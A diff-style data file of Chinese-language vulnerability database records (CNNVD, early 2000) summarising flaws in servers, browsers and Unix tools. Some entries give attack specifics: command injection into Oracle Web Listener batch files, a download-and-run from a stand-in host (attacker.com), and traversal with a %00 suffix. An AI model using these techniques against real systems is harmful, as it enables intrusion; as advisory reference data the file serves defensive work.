+ISC innd 2.x 远程缓冲区溢出漏洞,CNNVD-200002-033,2000-02-06,2005-05-02,低危,授权问题,innd 2.2.2版本存在缓冲区溢出漏洞。远程攻击者借助取消包含超长消息ID的请求可以执行任意命令。,CVE-2000-0472
+Novell GroupWise Web Access Enhancement Pack中Java服务器拒绝服务漏洞,CNNVD-200002-035,2000-02-07,2005-05-02,低危,授权问题,Novell GroupWise Web Access Enhancement Pack中Java服务器存在漏洞。远程攻击者借助超长服务程序 URL可以导致拒绝服务。,CVE-2000-0146
+Axis 700认证绕过漏洞,CNNVD-200002-034,2000-02-07,2005-05-16,高危,授权问题,Axis 700网络扫描仪无法正确限制管理员URL的访问权。用户借助..(点 点)攻击可以绕过密码保护。,CVE-2000-0144
+MySQL未认证远程访问漏洞,CNNVD-200002-036,2000-02-08,2006-09-21,中危,授权问题,MySQL 3.22版本存在漏洞。远程攻击者借助简短检查字符串可以绕过密码认证并访问数据库。,CVE-2000-0148
+SCO cu 漏洞,CNNVD-200002-038,2000-02-08,2005-05-02,高危,授权问题,UnixWare 7.x版本中SCO cu存在漏洞。本地用户利用此漏洞可以提升特权。,CVE-2000-0215
+Zeus Web服务器空结束字符串漏洞,CNNVD-200002-039,2000-02-08,2005-05-02,低危,授权问题,Zeus Web服务器存在漏洞。远程攻击者借助URL末端的空字符（%00）可以查看CGI程序的源代码。,CVE-2000-0149
+SCO OpenServer SNMPD默认共享漏洞,CNNVD-200002-037,2000-02-08,2005-10-20,低危,配置错误,SCO OpenServer中snmpd含有默认可写的SNMP共享字符串。本地攻击者利用此漏洞可以修改主机的配置。,CVE-2000-0147
+Internet Anywhere Mail服务器链接过载漏洞,CNNVD-200002-040,2000-02-10,2005-05-02,低危,其他,Internet Anywhere Mail服务器存在漏洞。远程攻击者借助大量的链接导致拒绝服务。,CVE-2000-0140
+Ultimate Bulletin Board任意命令执行漏洞,CNNVD-200002-041,2000-02-11,2005-05-02,超危,授权问题,Infopop Ultimate Bulletin Board (UBB)存在漏洞。远程攻击者借助主题隐藏字段中的shell元字符可以执行命令。,CVE-2000-0141
+SSH 安全漏洞,CNNVD-200002-042,2000-02-11,2022-08-18,中危,其他,SSH是 （SSH） 的一个应用协议。提供网络传输加密传输功能。 SSH 存在安全漏洞。没有shell访问权的本地用户借助此漏洞可以通过使用标准系统密码数据库验证的服务，例如 POP 或FTP，可以重定向TCP链接。,CVE-2000-0143
+Netopia Timbuktu Pro 安全漏洞,CNNVD-200002-043,2000-02-11,2022-08-18,低危,其他,Timbuktu Pro 2.0b650版本的认证协议存在安全漏洞。远程攻击者借助端口407和1417的链接导致拒绝服务。,CVE-2000-0142
+多个防火墙供应商FTP服务器漏洞,CNNVD-200002-044,2000-02-12,2006-11-16,高危,授权问题,Check Point Firewall-1 存在漏洞。远程攻击者通过强迫FTP服务器发送恶意数据包绕过端口访问限制，Firewall-1将此数据包曲解为客户端PASV尝试的有效227响应。,CVE-2000-0150
+NT自动任务/驱动器映射漏洞,CNNVD-200002-045,2000-02-14,2005-10-20,中危,其他,Windows NT调度程序使用目前登录到系统的交互式用户的驱动器映射。本地用户可以通过提供木马批处理文件代替原始批处理文件提升特权。,CVE-2000-0197
+Microsoft Windows 2000安装为保护的ADMIN$共享漏洞,CNNVD-200002-048,2000-02-15,2019-05-08,高危,其他,Windows 2000的安装无法激活管理员密码直到系统重启。远程攻击者利用此漏洞连接ADMIN$共享直到重启。,CVE-2000-0222
+Microsoft IIS 4.0 Pickup目录DoS漏洞,CNNVD-200002-046,2000-02-15,2005-10-20,低危,其他,IIS Inetinfo.exe存在漏洞。本地用户通过在pickup目录下创建含有超长名称和.txt.eml扩展的邮件文件可以导致拒绝服务。,CVE-2000-0167
+SCO UnixWare 7.x ARCserve特权提升漏洞,CNNVD-200002-047,2000-02-15,2005-05-02,低危,授权问题,SCO UnixWare 7.x版本的ARCserve代理存在漏洞。本地攻击者借助符号链接攻击可以提升根特权。,CVE-2000-0224
+SCO MMDF缓冲区溢出漏洞,CNNVD-200002-052,2000-02-16,2005-10-20,高危,授权问题,MMDF服务器存在缓冲区溢出漏洞。远程攻击者借助SMTP守护程序的超长MAIL FROM命令提升特权。,CVE-2000-0158
+Microsoft Internet Explorer 安全漏洞,CNNVD-200002-050,2000-02-16,2021-07-26,中危,其他,"Microsoft Internet Explorer（IE）是美国微软（Microsoft）公司的一款Windows操作系统附带的Web浏览器。 Internet Explorer 4.x 版本和 5.x版本存在安全漏洞。远程web服务器利用此漏洞可以访问超出安全域的客户端文件，又称为""Image Source Redirect""漏洞。",CVE-2000-0156
+SCO Unixware ARCserver /tmp符号链接漏洞,CNNVD-200002-049,2000-02-16,2005-10-20,低危,授权问题,UnixWare中的ARCserve代理存在漏洞。本地攻击者借助符号链接攻击可以修改任意文件。,CVE-2000-0154
+多个供应商BSD /proc文件系统漏洞,CNNVD-200002-051,2000-02-16,2005-05-02,高危,其他,BSD系统中的procfs存在漏洞。本地用户借助修改的标准错误的文件描述符，通过修改/proc/pid/mem接口提升根特权。,CVE-2000-0094
+HP Ignite-UX加密问题漏洞,CNNVD-200002-053,2000-02-17,2005-05-02,中危,授权问题,HP Ignite-UX创建信任系统镜像时无法存储/etc/密码。远程攻击者利用此漏洞可以将密码字段设置为空并且提升特权。,CVE-2000-0159
+Microsoft Windows autorun.inf漏洞,CNNVD-200002-055,2000-02-18,2005-10-20,高危,代码注入,Windows NT Autorun在不可移动媒体上执行autorun.inf文件。本地用户利用此漏洞可以在其他用户访问驱动器时指定一个备份程序执行。,CVE-2000-0155
+MS Site Server Commerce Edition输入验证漏洞,CNNVD-200002-054,2000-02-18,2005-05-02,高危,授权问题,Microsoft Site Server 3.0商业版的样本服务网站无法验证识别码。远程攻击者可以利用此漏洞执行SQL命令。,CVE-2000-0161
+Microsoft Internet Explorer 安全漏洞,CNNVD-200002-056,2000-02-18,2021-07-26,中危,其他,"Microsoft Internet Explorer（IE）是美国微软（Microsoft）公司的一款Windows操作系统附带的Web浏览器。 Internet Explorer 4.x 版本和 5.x版本中Microsoft virtual machine (VM)存在安全漏洞。远程攻击者借助逃脱Java沙盒的恶意小程序读取文件，又称为""VM File Reading"" 漏洞。",CVE-2000-0162
+Sun Internet Mail Server密码泄露漏洞,CNNVD-200002-057,2000-02-20,2005-05-02,高危,授权问题,Sun Internet Mail Server (SIMS)的安装创建了全局可读的文件。本地用户利用此漏洞获得密码。,CVE-2000-0164
+Microsoft Internet Explorer 安全漏洞,CNNVD-200002-060,2000-02-21,2021-07-26,高危,其他,Microsoft Internet Explorer（IE）是美国微软（Microsoft）公司的一款Windows操作系统附带的Web浏览器。 Internet Explorer 4.x 版本和5.x版本中The Microsoft Active Setup ActiveX组件存在安全漏洞。远程攻击者在没有提示软件的生产商为Microsoft时可以安装软件组件。,CVE-2000-0160
+InterAccess TelnetD Server远程缓冲区溢出漏洞,CNNVD-200002-059,2000-02-21,2005-05-02,超危,授权问题,InterAccess TelnetD Server是一种Telnet服务器程序。 InterAccess TelnetD Server 4.0 for Windows NT软件处理telnet会话中login命令的代码中存在未经检查的缓冲区，远程攻击者可能利用该缓冲区溢出漏洞执行任意指令。 <**>,CVE-2000-0166
+FreeBSD Asmon/Ascpu漏洞,CNNVD-200002-058,2000-02-21,2005-10-20,中危,授权问题,FreeBSD中asmon和ascpu存在漏洞。本地用户借助配置文件可以提升根特权。,CVE-2000-0163
+Sun Licensing Manager符号链接漏洞,CNNVD-200002-061,2000-02-21,2005-07-27,低危,授权问题,Sun Flex License Manager (FlexLM)中lit程序跟随符号链接。本地用户借助此漏洞可以修改任意文件。,CVE-2000-0210
+iPlanet Web Server 安全漏洞,CNNVD-200002-062,2000-02-23,2022-08-18,低危,其他,iPlanet Web Server 4.1版本存在安全漏洞。远程攻击者借助大量GET命令导致拒绝服务，消耗内存并导致内核崩溃。,CVE-2000-0182
+Sambar Server批处理CGI漏洞,CNNVD-200002-065,2000-02-23,2005-10-20,低危,授权问题,The Sambar服务器CGI目录包含批处理文件ECHO.BAT 和HELLO.BAT。 远程攻击者借助shell元字符可以执行命令。,CVE-2000-0213
+Microsoft Windows Media Services Handshake序列DoS序列漏洞,CNNVD-200002-063,2000-02-23,2005-10-12,低危,授权问题,"Windows Media服务器存在漏洞。远程攻击者借助一系列在不正确序列中传送的客户端handshake包导致拒绝服务，又称为""Misordered Windows Media Services Handshake""漏洞。",CVE-2000-0211
+RedHat Single User模式认证漏洞,CNNVD-200002-064,2000-02-23,2005-10-20,高危,授权问题,Red Hat 6.0版本存在漏洞。本地用户借助启动个人用户并在密码提示中点击^C可以提升根访问权。,CVE-2000-0219
+SSH客户端xauth漏洞,CNNVD-200002-070,2000-02-24,2006-09-05,中危,配置错误,SSH默认配置允许X转发。远程攻击者借助恶意xauth 程序可以控制客户端的X会话。,CVE-2000-0217
+InterAccess TelnetD Server 4.0终端配置漏洞,CNNVD-200002-066,2000-02-24,2005-07-27,低危,授权问题,InterAccess TelnetID Server 4.0版本存在漏洞。远程攻击者借助畸形终端客户端的配置信息导致拒绝服务。,CVE-2000-0212
+Corel Linux buildxconfig漏洞,CNNVD-200002-067,2000-02-24,2005-05-02,高危,授权问题,Corel Linux buildxconf存在漏洞。本地用户借助-x 或 -f参数可以修改或修改任意文件。,CVE-2000-0194
+ZoneAlarm 安全漏洞,CNNVD-200002-069,2000-02-24,2022-08-18,低危,其他,Check Point ZoneAlarm是以色列Check Point公司的一款网络防火墙程序。 ZoneAlarm 存在安全漏洞。如果一个用户请求有关事件的信息，ZoneAlarm在明文中传送敏感系统和网络信息到Zone Labs。,CVE-2000-0220
+Corel Linux setxconf漏洞,CNNVD-200002-071,2000-02-24,2005-05-02,高危,授权问题,Corel Linux setxconf存在漏洞。本地用户借助-T参数提升跟访问权，执行用户的.xserverrc文件。,CVE-2000-0195
+FTPx FTP Explorer弱密码加密漏洞,CNNVD-200002-068,2000-02-24,2005-10-20,中危,授权问题,FTP Explorer使用弱加密存储用FTP站点的户名，密码，配置文件。,CVE-2000-0214
+Bay/Nortel Networks Nautica Marlin路由器远程拒绝服务攻击漏洞,CNNVD-200002-072,2000-02-25,2005-05-02,低危,授权问题,Nautica Marlin是一种由Bay/Nortel Networks开发的路由器产品。 Nautica Marlin路由器产品易受拒绝服务攻击。发送一个0字节的UDP包给路由器的161(SNMP)端口将导致它停止响应。使用Nmap或者其他的UDP端口扫描器可以很容易地实现这种攻击。,CVE-2000-0221
+多个Linux供应商缓冲区溢出漏洞,CNNVD-200002-073,2000-02-26,2005-05-02,高危,授权问题,Linux man程序存在缓冲区溢出漏洞。本地用户借助MANPAGER环境变量可以提升特权。,CVE-2000-0170
+EZShopper远程命令执行漏洞,CNNVD-200002-075,2000-02-27,2005-10-20,高危,授权问题,EZShopper 3.0版本search.cgi CGI脚本存在漏洞。远程攻击者借助..(点 点)攻击读取任意文件或借助shell元字符执行命令。,CVE-2000-0188
+Lynx超长URL缓冲区溢出漏洞,CNNVD-200002-074,2000-02-27,2005-05-02,高危,授权问题,Lynx 2.x版本存在缓冲区溢出漏洞。远程攻击者借助恶意网页中的URL可以导致Lynx崩溃并可能执行命令。,CVE-2000-0209
+EZShopper远程命令执行漏洞,CNNVD-200002-076,2000-02-27,2005-10-20,高危,授权问题,EZShopper 3.0版本loadpage.cgi CGI脚本存在漏洞。远程攻击者借助..(点 点)攻击读取任意文件或借助shell元字符执行命令。,CVE-2000-0187
+HP OpenView OmniBack拒绝服务漏洞,CNNVD-200002-077,2000-02-28,2005-05-02,低危,授权问题,HP OpenView OmniBack 2.55版本存在漏洞。远程攻击者借助大量的55555端口连接导致拒绝服务。,CVE-2000-0179
+Foundry Networks ServerIron TCP/IP序列可预测漏洞,CNNVD-200002-079,2000-02-28,2006-08-24,高危,授权问题,Foundry Networks的ServerIron交换机具有可预测的TCP / IP序列号。远程攻击者借助此漏洞可以哄骗或劫持会话。,CVE-2000-0178
+Trend Micro OfficeScan远程拒绝服务攻击漏洞,CNNVD-200002-082,2000-02-28,2005-10-20,低危,其他,Trend Micro OfficeScan是美国趋势科技（Trend Micro）公司的一套分布式反病毒软件。安装过程中会提示是否采用WEB管理方式。如果选择采用WEB管理方式，OfficeScan客户端将侦听12345/TCP端口，用于定期接收病毒数据库更新或者来自OfficeScan管理端的命令。 远程攻击者有好几种办法对Trend Micro OfficeScan进行拒绝服务攻击。 向12345/TCP发送随机数据，tmlisten.exe的CPU占用率将高达100%，并引发一个Visual C++错误，最终导致机器崩溃。 向12345/TCP发送随机数据的同时，打开5个以上到该端口的TCP连接，该端口上的服务将停止响应。必须重启服务才能恢复正常。 同一网段的用户可能利用Sniffer捕捉管理命令，修改后重新发往客户端，这些请求的最后两个字节意义如下: 04: 远程卸载OfficeScan客户端 06: 开始扫描 07: 停止扫描 OfficeScan客户端向OfficeScan管理端提交URL请求，获取一些配置信息。如果攻击者伪造了一台有效的OfficeScan管理端服务器，就可能更改OfficeScan客户端扫描策略，比如只扫描.txt文件，不扫描软盘、光盘，指示OfficeScan客户端将被感染文件移动到别的位置。,CVE-2000-0204
+nmh缓冲区溢出漏洞,CNNVD-200002-080,2000-02-28,2005-05-02,高危,授权问题,Linux nmh包中mhshow存在缓冲区溢出漏洞。远程攻击者借助电子邮件的恶意MIME头可以执行命令。,CVE-2000-0196
+"多个供应商 ""dump""缓冲区溢出漏洞",CNNVD-200002-081,2000-02-28,2005-05-02,高危,授权问题,Linux ext2fs backup包中转储工具存在缓冲区溢出漏洞。本地用户借助超长命令行参数可以提升特权。,CVE-2000-0186
+Trend Micro OfficeScan远程拒绝服务攻击漏洞,CNNVD-200002-078,2000-02-28,2005-10-20,低危,其他,Trend Micro OfficeScan是美国趋势科技（Trend Micro）公司的一套分布式反病毒软件。安装过程中会提示是否采用WEB管理方式。如果选择采用WEB管理方式，OfficeScan客户端将侦听12345/TCP端口，用于定期接收病毒数据库更新或者来自OfficeScan管理端的命令。 远程攻击者有好几种办法对Trend Micro OfficeScan进行拒绝服务攻击。 向12345/TCP发送随机数据，tmlisten.exe的CPU占用率将高达100%，并引发一个Visual C++错误，最终导致机器崩溃。 向12345/TCP发送随机数据的同时，打开5个以上到该端口的TCP连接，该端口上的服务将停止响应。必须重启服务才能恢复正常。 同一网段的用户可能利用Sniffer捕捉管理命令，修改后重新发往客户端，这些请求的最后两个字节意义如下: 04: 远程卸载OfficeScan客户端 06: 开始扫描 07: 停止扫描 OfficeScan客户端向OfficeScan管理端提交URL请求，获取一些配置信息。如果攻击者伪造了一台有效的OfficeScan管理端服务器，就可能更改OfficeScan客户端扫描策略，比如只扫描.txt文件，不扫描软盘、光盘，指示OfficeScan客户端将被感染文件移动到别的位置。,CVE-2000-0203
+Serv-U FTP 服务器路径泄漏漏洞,CNNVD-200002-085,2000-02-29,2005-10-20,低危,授权问题,Serv-U 2.5d和更早版本的默认配置存在漏洞。远程攻击者通过请求不存在的目录或文件的URL确定服务器的真实路径名。,CVE-2000-0176
+ht://dig任意文件包含漏洞。,CNNVD-200002-083,2000-02-29,2005-05-02,低危,授权问题,htdig (ht://Dig)CGI程序htsearch存在漏洞。远程攻击者通过使用htsearch参数中反引号(`)封闭文件名可以读取任意文件。,CVE-2000-0208
+"Microsoft Outlook, Exchange,Windows Messaging电子邮件响应漏洞",CNNVD-200002-086,2000-02-29,2006-09-01,中危,授权问题,"Microsoft Outlook, Exchange,和Windows Messaging中电子邮件客户端自动响应Read Receipt和Delivery Receipt标签。远程攻击者通过伪造重定向到超大分配列表的Read Receipt请求使邮件系统充满响应。",CVE-2000-0216
+Axis StorPoint CD访问控制漏洞,CNNVD-200002-084,2000-02-29,2005-05-16,超危,授权问题,Axis StorPoint CD存在漏洞。远程攻击者借助..(点 点)攻击可以在未经认证情况下访问管理员URL。,CVE-2000-0191
+Allaire ColdFusion远程服务器信息泄露漏洞,CNNVD-200003-003,2000-03-01,2005-05-02,低危,其他,Allaire ColdFusion是Macromedia 公司开发的一款Web应用服务器软件。 Allaire ColdFusion application.cfm的脚本实现上存在漏洞，远程攻击者可能收集到主机相关的一些有用信息。 正常的ColdFusion模板调用错误会被<cferror>或者<cftry> / <cfcatch>捕获。但是当Web站点有一个application.cfm(或者onrequestend.cfm)时，如果用户试图从客户端直接调用它，ColdFusion将返回一个错误信息页面，其中会显示Web服务器的根路径。因为这两个模板是ColdFusion保留的用来进行应用层设置，不该直接从Web客户端调用。,CVE-2000-0189
+SGI IRIX InfoSearch CGI远程执行任意命令漏洞,CNNVD-200003-001,2000-03-01,2005-07-27,高危,授权问题,"InfoSearch是SGI IRIX操作系统所带的CGI程序，用来查看在线图书，man页和发布消息。 软件包中的infosrch.cgi脚本实现上存在输入验证漏洞，远程攻击者可能利用此漏洞对在Web进程的权限在主机上执行任意命令。 infosrch.cgi脚本在将'fname'变量的传送给man2html程序前，它没有正确检查参数内容，远程攻击者可以在输入中混入SHELL转义字符比如"";""从而在主机上执行任意命令。",CVE-2000-0207
+MS IE HTML Help捷径漏洞,CNNVD-200003-002,2000-03-01,2005-05-02,中危,其他,Internet Explorer 5.x版本的window.showHelp()方法无法限制从本地主机执行HTML help文件(.chm)。远程攻击者借助Microsoft Networking可以执行任意命令。,CVE-2000-0201
+AOL Instant Messenger拒绝服务漏洞,CNNVD-200003-006,2000-03-02,2005-10-20,低危,授权问题,AOL Instant Messenger (AIM)存在漏洞。远程攻击者借助含有畸形的ASCII码的消息可以导致拒绝服务。,CVE-2000-0190
+多个供应商CDETT Session缓冲区溢出漏洞,CNNVD-200003-007,2000-03-02,2005-05-02,高危,授权问题,ToolTalk共享目录的TT_SESSION环境变量存在缓冲区溢出漏洞。本地用户利用此漏洞可以提升根特权。,CVE-1999-0693
+DNSTools输入验证漏洞,CNNVD-200003-004,2000-03-02,2005-10-20,超危,授权问题,DNSTools CGI应用程序存在漏洞。远程攻击者借助shell元字符可以执行任意命令。,CVE-2000-0177
+Corel Linux Dosemu访问控制及特权提升漏洞,CNNVD-200003-005,2000-03-02,2005-05-02,高危,授权问题,Corel Linux 1.0版本的Dosemu的默认配置存在漏洞。本地用户利用此漏洞可以执行system.com程序并提升特权。,CVE-2000-0193
+多个供应商mtr漏洞,CNNVD-200003-009,2000-03-03,2005-05-02,高危,授权问题,mtr程序在尝试放弃特权时只使用一个seteuid调用。本地用户利用此漏洞可以提升根特权。,CVE-2000-0172
+Trend Micro OfficeScan远程拒绝服务攻击漏洞,CNNVD-200003-008,2000-03-03,2005-10-20,低危,其他,Trend Micro OfficeScan是美国趋势科技（Trend Micro）公司的一套分布式反病毒软件。安装过程中会提示是否采用WEB管理方式。如果选择采用WEB管理方式，OfficeScan客户端将侦听12345/TCP端口，用于定期接收病毒数据库更新或者来自OfficeScan管理端的命令。 远程攻击者有好几种办法对Trend Micro OfficeScan进行拒绝服务攻击。 向12345/TCP发送随机数据，tmlisten.exe的CPU占用率将高达100%，并引发一个Visual C++错误，最终导致机器崩溃。 向12345/TCP发送随机数据的同时，打开5个以上到该端口的TCP连接，该端口上的服务将停止响应。必须重启服务才能恢复正常。 同一网段的用户可能利用Sniffer捕捉管理命令，修改后重新发往客户端，这些请求的最后两个字节意义如下: 04: 远程卸载OfficeScan客户端 06: 开始扫描 07: 停止扫描 OfficeScan客户端向OfficeScan管理端提交URL请求，获取一些配置信息。如果攻击者伪造了一台有效的OfficeScan管理端服务器，就可能更改OfficeScan客户端扫描策略，比如只扫描.txt文件，不扫描软盘、光盘，指示OfficeScan客户端将被感染文件移动到别的位置。,CVE-2000-0205
+Microsoft Windows MS-DOS设备名远程拒绝服务攻击漏洞(MS00-017),CNNVD-200003-010,2000-03-04,2012-11-28,低危,其他,Microsoft Windows是最流行的计算机操作系统。 Microsoft Windows处理特殊的设备文件名时存在漏洞，远程或本地攻击者可能利用此漏洞对主机进行拒绝服务攻击，导致主机崩溃重启。,CVE-2000-0168
+Caldera OpenLinux rpm_query CGI泄漏系统RPM包安装信息漏洞,CNNVD-200003-011,2000-03-05,2005-05-02,低危,授权问题,OpenLinux是Caldera公司出品的一个Linux发行版本。 对于某些版本的OpenLinux，存在一个默认安装的脚本，可能会导致系统信息泄漏。 Caldera OpenLinux 2.3完全安装后会安装一个名为rpm_query的CGI程序，默认位置在/home/httpd/cgi-bin/。任何人都可以远程连接到Web服务器上，利用这个CGI获取系统所安装的所有rpm包的完整列表。其中包括已经安装的软件及其版本等信息。攻击者可以利用这些信息判断系统是否安装了一些有安全问题的软件，从而进行相应的攻击。,CVE-2000-0192
+Oracle for Linux安装漏洞,CNNVD-200003-012,2000-03-05,2005-05-02,中危,授权问题,Linux Oracle 8.1.5.x版本的安装跟随符号链接并创建全局可读许可的orainstRoot.sh文件。本地用户利用此漏洞提升特权。,CVE-2000-0206
+Microsoft Clip Ar缓冲区溢出漏洞,CNNVD-200003-013,2000-03-06,2005-10-12,中危,授权问题,Microsoft Clip Art Gallery存在缓冲区溢出漏洞，远程攻击者借助畸形的CIL (clip art library)文件可以导致拒绝服务漏洞或执行命令。,CVE-2000-0200
+Pocsag POC32访问控制漏洞,CNNVD-200003-014,2000-03-07,2005-05-02,低危,授权问题,Pocsag POC32程序无法正确阻止远程用户访问服务器端口，即使选项是无效的。,CVE-2000-0225
+RealServer内部IP地址泄漏漏洞,CNNVD-200003-015,2000-03-08,2006-01-05,低危,授权问题,RealMedia RealServer 泄露Real Server的真正IP地址，即使这个地址应该是私有的。,CVE-2000-0185
+Microsoft SQL Server无效查询漏洞,CNNVD-200003-016,2000-03-08,2006-09-01,中危,授权问题,Microsoft SQL Server 7.0版本和Microsoft Data Engine (MSDE) 1.0版本存在漏洞 。远程攻击者借助SQL查询中畸形的选择语句可以提升特权。,CVE-2000-0202
+WorldView Wnn Jserver远程缓冲区溢出漏洞,CNNVD-200010-054,2000-03-08,2005-10-20,超危,授权问题,Wnn是一个日语翻译系统，常常用于Unix系统以提供外语支持。它是一个服务器-客户端的应用程序，Jserver部分作为服务器端，为客户端提供翻译服务。 某些版本的Wnn存在远程缓冲区溢出漏洞，远程攻击者可能利用此漏洞通过溢出攻击在主机上以Jserver进程的权限执行任意指令。 向Jserver提交诸如JS_OPEN、JS_MKDIR 或JS_FILE_INFO这些Wnn命令时，跟随一个超长字符串，就会导致远程缓冲区溢出。精心构造导致溢出的字符串，有可能以Jserver所拥有的权限执行任意指令，通常可获取root用户权限。,CVE-2000-0704
+StarOffice StarScheduler任意文件读取漏洞,CNNVD-200003-018,2000-03-09,2005-05-02,低危,授权问题,StarOffice StarScheduler web服务器存在漏洞。远程攻击者借助..(点 点)攻击可以读取任意文件。,CVE-2000-0174
+Printtool打印机共享密码漏洞,CNNVD-200003-017,2000-03-09,2005-05-02,低危,授权问题,Linux printtool将打印机配置文件的许可设置为全局可读。本地攻击者利用此漏洞可以获得打印机共享密码。,CVE-2000-0184
+StarOffice StarScheduler远程缓冲区溢出漏洞,CNNVD-200003-019,2000-03-09,2005-05-02,超危,授权问题,StarOffice StarScheduler web服务器存在缓冲区溢出漏洞。远程攻击者借助超长GET命令可以提升根访问权。,CVE-2000-0175
+wmcdplay缓冲区溢出漏洞,CNNVD-200003-021,2000-03-10,2005-05-02,高危,授权问题,WindowMaker桌面wmcdplay CD player程序存在缓冲区溢出漏洞。本地用户借助超长参数可以提升根特权。,CVE-2000-0223
+IrcII DCC Chat缓冲区溢出漏洞,CNNVD-200003-020,2000-03-10,2005-05-02,低危,授权问题,ircII 4.4版本IRC客户端存在缓冲区溢出漏洞。远程攻击者借助DCC聊天功能可以执行命令。,CVE-2000-0183
+SCO UnixWare EELS系统拒绝服务漏洞,CNNVD-200003-022,2000-03-10,2005-10-20,低危,授权问题,SCO UnixWare 7.1.x版本中EELS系统存在漏洞。远程攻击者利用此漏洞可以导致拒绝服务。,CVE-2000-0173
+Check Point Firewall-1内部地址泄漏漏洞,CNNVD-200003-023,2000-03-11,2006-01-04,低危,授权问题,Firewall-1 3.0版本和4.0版本泄漏私人IP地址信息。远程攻击者利用此漏洞可以确定正在连接的主机的真正IP地址。,CVE-2000-0181
+Linux atsar 文件操作漏洞,CNNVD-200003-024,2000-03-11,2005-05-02,高危,授权问题,在Linux的atsar包中的atsadc存在漏洞，不能正确验证输出文件的权限，本地用户可以利用这个漏洞获得根用户权限。,CVE-2000-0171
+Netscape Enterprise Server漏洞,CNNVD-200003-025,2000-03-11,2010-12-02,中危,授权问题,Netscape Enterprise Server 中的主页发布功能存在漏洞，远程攻击者可以通过对提供Java applet程序的/publisher目录的GET请求浏览任意目录。,CVE-2000-0237
+多个Linux厂商的imwheel漏洞,CNNVD-200003-026,2000-03-13,2005-05-02,高危,授权问题,imwheel中存在缓冲区溢出漏洞，本地用户可以通过imwheel-solo脚本和超长HOME环境变量获得根用户权限。,CVE-2000-0230
+Microsoft SQL密码弱加密漏洞,CNNVD-200003-028,2000-03-14,2006-09-01,高危,授权问题,"Microsoft SQL 7.0存在漏洞，企业管理员在注册时，如果""Always prompt for login name and password"" 选项没有设置，就可以使用一个弱强度的用户名和密码登陆。",CVE-2000-0199
+Sojourn搜索引擎CGI程序泄露文件漏洞,CNNVD-200003-027,2000-03-14,2005-05-02,低危,授权问题,Sojourn是一个商业搜索引擎软件。主页是http://www.generationterrorists.com/sojourn_superuser.html Sojourn存在一个安全问题，可导致系统文件内容泄露。 在正运行这个软件的Web服务器上，任何Web Server有权读取的文件都可能泄露给远程攻击者。Sojourn软件可以将一个Web站点分类组织，这些类别可以通过sojourn.cgi(Perl脚本)来访问，通常是用下列请求实现： http ://target/cgi-bin/sojourn.cgi?cat=categoryname 每一类都有一个与categoryname(类别名)对应的.txt文件.这个程序将在'cat'变量中的内容后面增加'.txt'扩展名，然后显示它的内容。然而这个程序允许攻击者在'cat'变量内容中输入'../'字符串，因此，攻击者可以访问Web服务器上任意的.txt文件(如果Webserver有读权限的话)，这个限制也能很容易的被绕过，攻击者只要在所要求的文件后面加上%00，就会屏蔽掉后面所加的.txt后缀。,CVE-2000-0180
+Atrium Software Mercur WebView WebMail-Client的缓冲区溢出漏洞,CNNVD-200003-030,2000-03-15,2005-10-20,低危,授权问题,MERCUR WebView WebMail服务器存在缓冲区溢出漏洞，远程攻击者通过在GET请求中的超长mail_user参数触发拒绝服务。,CVE-2000-0239
+SuSE Linux IMAP 漏洞,CNNVD-200003-029,2000-03-15,2010-12-02,超危,授权问题,SuSE Linux IMAP服务器存在漏洞，远程攻击者可以利用这个漏洞绕过IMAP认证并取得权限。,CVE-2000-0233
+Atrium Software Mercur Mail Server 3.2 Multiple 的缓冲区溢出漏洞,CNNVD-200003-031,2000-03-15,2005-10-20,低危,授权问题,MERCUR 邮件服务器组中的POP3和IMAP存在缓冲区溢出漏洞，远程攻击者可以利用这个漏洞触发拒绝服务。,CVE-2000-0198
+Oracle Web Listener批处理文件可用来远程执行任意命令漏洞,CNNVD-200003-032,2000-03-15,2006-04-07,高危,授权问题,"Oracle WebServer是一个与Oracle7 Server紧密集成的HTTP服务器，能够由存储在Oracle数据库的数据建立动态HTML文件。Oracle Web Listener是其组件之一，接收使用任何浏览器的用户发出的请求。对于静态(基于文件的)页面请求被监听进程立即处理，其功能即是一个HTTP服务器。 Oracle Web Listener for NT在安装了OAS后，缺省设置下，/ows-bin目录(映射到C:\orant\ows\4.0\bin)下安装了一些批处理文件，这些文件能被攻击者用来在服务器上执行任意命令。 攻击者只需要在批处理文件的后面增加""?&""字符串，以及要执行的命令即可。这些命令将 在""SYSTEM""级别运行。攻击者甚至不需要知道确切的批处理文件的名称，用'*'通配符就可以匹配目录下所有的批处理文件。 另外，攻击者也可以用UNC(Universal Naming Conversion)路径(例如：\\attacker.com\getadmin.exe)下载并执行远程主机上的程序。 <*链接：http://www.cerberus-infosec.co.uk/advisories.shtml *>",CVE-2000-0169
+多个Linux厂商的kreatecd漏洞,CNNVD-200003-033,2000-03-16,2005-05-02,高危,配置错误,Linux kreatecd存在漏洞，它信任用来查找cdrecord程序的user-supplied路径，本地用户可以利用这个漏洞获得根权限。,CVE-2000-0231
+诺顿杀毒软件漏洞,CNNVD-200003-034,2000-03-17,2010-12-02,低危,授权问题,Internet邮件网关中web服务器的诺顿杀毒软件存在漏洞，远程攻击者可以通过超长URL触发拒绝服务。,CVE-2000-0238
+Netscape Enterprise Server 3.x Web Publishing泄露目录列表漏洞,CNNVD-200003-035,2000-03-17,2006-09-05,低危,配置错误,"Netscape Enterprise Server是一个Netscape公司开发的Web服务器。 在Netscape Enterprise Server 3.x版本中的""Web Publishing""(主页发布)功能将允许远程攻击者浏览根目录以及子目录内容。 远程攻击者可以通过提交一个包含Web Publishing标记的URL(?wp)请求来完成攻击。Netscape Enterprise Server默认安装时，""Directory Indexing""功能是打开的，可以通过禁止目录列表功能来防止上述问题。",CVE-2000-0236
+Microsoft Windows Media License Manager的拒绝服务漏洞,CNNVD-200003-036,2000-03-17,2005-10-12,低危,授权问题,Microsoft Windows Media License Manager存在拒绝服务漏洞，远程攻击者可以通过发送异常请求导致管理器挂起触发这个漏洞，也称为“Malformed Media许可证请求”漏洞。,CVE-2000-0228
+Lotus Domino Server ESMTP远程缓冲区溢出漏洞,CNNVD-200005-075,2000-03-18,2005-05-02,低危,授权问题,Lotus Domino服务器是一款基于WEB合作的应用程序架构，运行在Linux/Unix和Microsoft Windows操作系统平台下。 Lotus Domino服务器的ESMTP服务存在缓冲区溢出漏洞，远程攻击者可能可以利用这个漏洞进行拒绝服务攻击。 Lotus Domino服务器的ESMTP服务在处理'rcpt to'、'saml from'和'soml from'命令时缺乏缓冲区检查。如果Lotus Domino服务器接受到这三个命令中任意一个，并且参数超过4 KB，系统将崩溃并且只有重起才能恢复继续服务。,CVE-2000-0452
